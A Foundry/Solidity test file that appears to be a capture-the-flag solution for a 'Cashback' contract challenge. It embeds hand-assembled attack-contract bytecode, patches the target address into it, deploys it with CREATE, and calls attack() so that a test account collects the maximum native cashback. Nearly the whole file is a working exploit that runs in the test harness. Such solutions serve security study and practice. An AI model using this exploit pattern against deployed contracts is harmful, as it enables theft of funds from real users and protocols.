// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Currency, CurrencyLibrary, Cashback} from "./Cashback.sol";
import {
    ICashbackAttack,
    BASIS_POINTS,
    NATIVE_CASHBACK_RATE,
    NATIVE_MAX_CASHBACK,
    FREEDOM_CASHBACK_RATE,
    FREEDOM_MAX_CASHBACK,
    FREEDOM_ADDR,
    SUPER_NFT_ADDR
} from "./CashbackAttack.sol";
import {Test, console} from "forge-std/Test.sol";

// Cashback contract addr: 0xdCc409Af2566c47F6DA4d30Eae8155b332A64078
bytes constant ATTACK_CREATION_BYTECODE =
    hex"61022f8061000d5f39805ff3fe603756dcc409af2566c47f6da4d30eae8155b332a6407800000000000000000000000000000000000000000000000000000000000000005b6100413415610219565b610049610168565b6361bd21b2811461007957638380edb7811461012f5763f360c183811461013c576334b151188114610151575f5ffd5b6100825f6101b0565b61008c60016101b0565b61009660026101b0565b6100a0600261018f565b6100aa600361018f565b6100b4600461018f565b604051600461022b823984600482015282602482015260445f5f82845f8c5af16100dd81610219565b81830160405260405192506004610227843930600484015287602484015285604484015283606484015260a060848401525f60a484015260c491505f5f83855f8d5af1905061012b81610219565b5f5ff35b6101376101ea565b610162565b61014d6101485f61018f565b61020c565b5f5ff35b61016161015c6101fd565b6101e2565b5b50610225565b5f7c01000000000000000000000000000000000000000000000000000000005f3504905090565b5f60208202600401602081013610156101a6575f5ffd5b8035915050919050565b5f6101ba8261018f565b905073ffffffffffffffffffffffffffffffffffffffff198116156101dd575f5ffd5b919050565b805f5260205ff35b6101f460016101e2565b565b5f5f905090565b5f6102066101f6565b54905090565b806102156101f6565b5550565b80610222575f5ffd5b50565bfef242432aebc39613";

// forge-lint: disable-next-item(asm-keccak256)
contract SolveCashback is Test {
    Cashback cashback;
    ICashbackAttack cc;
    address attackAddr;

    address payable alice;
    uint256 aliceSK;

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        // currencies
        address[] memory _currencies = new address[](2);
        _currencies[0] = Currency.unwrap(CurrencyLibrary.NATIVE_CURRENCY);
        _currencies[1] = FREEDOM_ADDR;

        // cashback
        uint256[] memory _cashbacks = new uint256[](2);
        _cashbacks[0] = NATIVE_CASHBACK_RATE;
        _cashbacks[1] = FREEDOM_CASHBACK_RATE;

        // maxCashback
        uint256[] memory _maxCashbacks = new uint256[](2);
        _maxCashbacks[0] = NATIVE_MAX_CASHBACK;
        _maxCashbacks[1] = FREEDOM_MAX_CASHBACK;

        // superCashbackNFT addr
        address _superCashbackNFT = SUPER_NFT_ADDR;

        cashback = new Cashback(_currencies, _cashbacks, _maxCashbacks, _superCashbackNFT);

        // deploy the creation bytecode of attack contract
        address addr;
        bytes memory creation = _updateCashbackAddrInCode(ATTACK_CREATION_BYTECODE, address(cashback));
        assembly {
            addr := create(0, add(creation, 0x20), mload(creation))
        }
        require(addr != address(0), "CREATE failed");
        emit log_bytes(addr.code);
        cc = ICashbackAttack(addr);

        _setUpAccounts();

        vm.stopPrank();
    }

    function _updateCashbackAddrInCode(bytes memory code, address cashbackAddr) internal pure returns (bytes memory creation) {
        uint256 byteAddrStart = 16;
        creation = code;

        bytes20 addrBytes = bytes20(cashbackAddr);
        for (uint256 i = 0; i < 20; ++i) {
            creation[byteAddrStart + i] = addrBytes[i];
        }
    }

    function _setUpAccounts() internal {
        aliceSK = 0xA11CE;
        alice = payable(vm.addr(aliceSK));
        vm.deal(alice, 1 ether);
        vm.label(alice, "alice");
    }

    function testSolveCashback() public {
        vm.startPrank(alice, alice);

        // native currency
        address currency = Currency.unwrap(CurrencyLibrary.NATIVE_CURRENCY);
        uint256 expenseAmt = NATIVE_MAX_CASHBACK * BASIS_POINTS / NATIVE_CASHBACK_RATE;
        cc.attack(address(cashback), alice, currency, expenseAmt, NATIVE_MAX_CASHBACK);

        // Confirm the state
        uint256 nativeCashback = cashback.balanceOf(alice, CurrencyLibrary.NATIVE_CURRENCY.toId());
        console.log("nativeCashback: %s", nativeCashback);
        assertEq(nativeCashback, NATIVE_MAX_CASHBACK);

        vm.stopPrank();
    }
}
